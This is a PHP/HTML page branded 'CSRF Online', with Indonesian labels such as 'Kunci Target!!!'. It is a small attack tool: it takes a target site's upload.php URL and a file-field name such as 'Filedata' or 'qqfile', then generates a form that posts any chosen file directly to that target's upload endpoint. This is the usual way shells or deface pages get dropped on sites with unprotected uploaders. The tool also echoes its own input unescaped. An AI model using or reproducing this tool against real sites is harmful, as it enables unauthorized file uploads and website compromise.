<html>
<head>
<title>CSRF</title>
</head>
<body>
<center>
<body bgcolor="white">
<font size="6" color="#A50604" face="Orbitron" style="text-shadow:1px 0px 5px blue;">CSRF Online</font>
<br>
<font color="aqua">
====================================================================================================================================================
</font>
<br>
<font size="3" color="lime">Terimakasih Untuk<br><font size="6" color="red" face="Wallpoet" style="text-shadow: 1px 0px 5px blue;" > My Friend </font> <br> <font color="black" </font> And  <font color="lime" </font> <marquee behavior="alternate" onmouseover="this.stop()"onmouseout="this.start()">~You~</marquee>
</font>
<br>
<font color="aqua">
====================================================================================================================================================
</font><br>
<img src="https://i.pinimg.com/originals/c8/94/c9/c894c95b8682691754470336c9b26e7c.jpg" width="600" height="600">
<form method="post">
<font size="6" color="red" face="Wallpoet" style="text-shadow: 1px 0px 5px purple;">
URL: <input type="text" name="url" size="50" height="10" placeholder="http://www.target.com/[path]/upload.php" style="margin: 5px auto; padding-left: 5px;" required><br>
POST File: <input type="text" name="pf" size="50" height="10" placeholder="Filedata / files[] / qqfile / userfile / dll" style="margin: 5px auto; padding-left: 5px;" required><br></font>
<input type="submit" name="d" value="Kunci Target!!!">
</form>
<?php
$url = $_POST['url'];
$pf = $_POST['pf'];
$d = $_POST['d'];
if($d) {
    echo "<form method='post' target='_blank' action='$url' enctype='multipart/form-data'><input type='file' name='$pf'><input type='submit' name='g' value='Genjot cuks!'></form";
}
?>
</form>
</center>
</body>
</html>